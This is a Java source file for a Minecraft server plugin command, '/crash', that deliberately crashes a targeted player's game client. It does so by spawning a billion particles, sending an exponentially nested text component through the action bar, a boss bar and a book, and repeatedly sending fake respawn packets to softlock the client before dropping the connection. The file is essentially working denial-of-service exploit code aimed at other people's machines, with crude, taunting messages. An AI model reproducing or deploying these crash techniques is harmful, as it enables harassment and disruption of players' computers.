package me.totalfreedom.totalfreedommod.cmd;

import com.destroystokyo.paper.ClientOption;
import com.github.retrooper.packetevents.PacketEvents;
import com.github.retrooper.packetevents.PacketEventsAPI;
import com.github.retrooper.packetevents.protocol.player.GameMode;
import com.github.retrooper.packetevents.protocol.player.User;
import com.github.retrooper.packetevents.protocol.world.Difficulty;
import com.github.retrooper.packetevents.protocol.world.dimension.DimensionType;
import com.github.retrooper.packetevents.protocol.world.dimension.DimensionTypes;
import com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerRespawn;
import net.kyori.adventure.bossbar.BossBar;
import net.kyori.adventure.inventory.Book;
import org.bukkit.Particle;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

import net.kyori.adventure.text.Component;
import net.kyori.adventure.text.minimessage.tag.resolver.Placeholder;

import me.totalfreedom.totalfreedommod.cmd.internal.annotation.*;

import java.util.Random;

@Command(name = "crash", description = "Crashes the specified player", usage = "/crash <player>", aliases = {"fuckup"})
@Permission(permission = "tfm.admin.fuckup")
public class Command_crash extends FCommand
{
    private static final Random RANDOM = new Random();

    @Callback
    public void crash(final CommandSender sender, final Player player)
    {
        if (isProtectedAdmin(sender, player))
        {
            return;
        }

        // Crash their client with a huge amount of particles
        player.spawnParticle(
                Particle.ASH,
                player.getLocation(),
                1_000_000_000,
                0.0,
                0.0,
                0.0,
                1.0,
                null,
                true
        );

        // Cripple their ability to see blocks in front of them
        player.setSendViewDistance(0);

        // Prepare the second approach to crashing their client in case they have particles disabled
        Component c = Component.text("GET ABSOLUTELY FUCKED!");
        for (int i = 0; i < 50; ++i)
            c = Component.translatable("%1$s%1$s%1$s", "%1$s%1$s%1$s", c);

        // Hit their action bar with this
        player.sendActionBar(c);
        // Send it as a boss bar if they have action bars blocked
        player.showBossBar(BossBar.bossBar(c, 0.69F, BossBar.Color.RED, BossBar.Overlay.PROGRESS));
        // Okay, fine, we'll just throw the book at them
        player.openBook(Book.book(c, c, c));

        // If all else fails, let's softlock them with fake dimension updates sent every tick
        if (server().getPluginManager().isPluginEnabled("packetevents"))
        {
            final PacketEventsAPI<?> api = PacketEvents.getAPI();
            final User user = api.getPlayerManager().getUser(player);

            final DimensionType[] types = DimensionTypes.getRegistry().getEntries().toArray(new DimensionType[0]);

            long startTime = System.currentTimeMillis();

            server().getScheduler().runTaskTimer(plugin(), task ->
            {
                // Stop this task if the player has logged off
                if (!player.isOnline() || user == null)
                {
                    task.cancel();
                    return;
                }

                // Generate a random dimension name
                final String randomName = RANDOM.ints(97, 122)
                        .limit(RANDOM.nextInt(1, 16))
                        .collect(StringBuilder::new, StringBuilder::appendCodePoint, StringBuilder::append)
                        .toString();

                // Avoid spamming the logs with "moved too quickly" messages
                player.teleportAsync(player.getLocation().set(0, 60, 0));

                // Send fictitious respawn packets with random dimensions specified, which cause the client to enter a
                //  transition period in preparation for a dimension swap... which will never come. This can softlock
                //  the client or at least make it very difficult to escape.
                user.sendPacket(new WrapperPlayServerRespawn(types[RANDOM.nextInt(types.length)],
                        randomName,
                        Difficulty.values()[RANDOM.nextInt(Difficulty.values().length)],
                        RANDOM.nextLong(),
                        GameMode.values()[RANDOM.nextInt(GameMode.values().length)],
                        GameMode.values()[RANDOM.nextInt(GameMode.values().length)],
                        true,
                        true,
                        (byte) 0x69,
                        null,
                        0,
                        69));

                // Kill the connection after 10 seconds - some older patched clients are prone to flashing lights and
                //  that may cause people genuine harm.
                if (System.currentTimeMillis() - startTime >= 10_000)
                {
                    user.closeConnection();
                }
            }, 0L, 1L);
        }

        msg(sender, "<gray>Crashed <player>.",
                Placeholder.unparsed("player", player.getName())
        );
    }
}